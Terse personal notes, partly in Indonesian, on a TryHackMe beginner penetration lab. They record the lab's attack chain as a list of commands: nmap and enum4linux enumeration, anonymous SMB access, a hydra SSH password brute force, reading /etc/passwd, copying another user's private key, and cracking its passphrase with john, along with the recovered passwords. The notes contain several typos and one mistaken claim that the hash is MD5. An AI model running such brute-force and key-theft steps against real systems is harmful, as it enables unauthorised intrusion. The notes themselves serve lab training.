# basic penetrasi
enum4linux
smbclient
hydra

## deploy
- 10.10.74.242

## praktek
- nmap -sC -sV -oN nmap/init 10.10.72.242
- scan
```
22
80
139
445
8009
8080
```
- enum4linux -a 10.10.74.242 | tee enum4linux.log
- smbclient //10.10.74.242/Anonymous
    - get staff.txt /home/ariafatah/tryhackme/staff.txt
- cat staff.tct
    - username = kay jan
- smbclient //10.10.74.242/ipc$
- hydra -l jan -P /usr/share/worldlist/rockyou.txt ssh://10.10.72.242
    - pass = armando
- ssh jan@10.10.74.242
    - uname -r => operation system
    - cat /etc/*issue
    - ls -al
    - cat /etc/passwd
        - kay: 1000 => is root
    - cd ../kay
        - ls -al
        - cd ./ssh
        - cat id_rsa
        - copy
    - paste in /tryhackme/ssh/id_rsa
        - cd ssh/id_rsa
    - locate ssh2j
    - /usr/share/john/ssh2john2.py id_rsa > hash.txt
    - cat hash.txt
        - check first line: sshng$1$
    - open linux shadow hash
        - $1$ is MD5
    - jhon hash.txt --worldlist=/usr/share/worldlist/rockyou.txt
        - pass = beeswax (id_rsa)
    - ssh -i id_rsa kay@10.10.74.242
        - beeswax
    - cat pass.bax
        - heresareallystrongpasswordthatfollowsthepasswordpolicy$$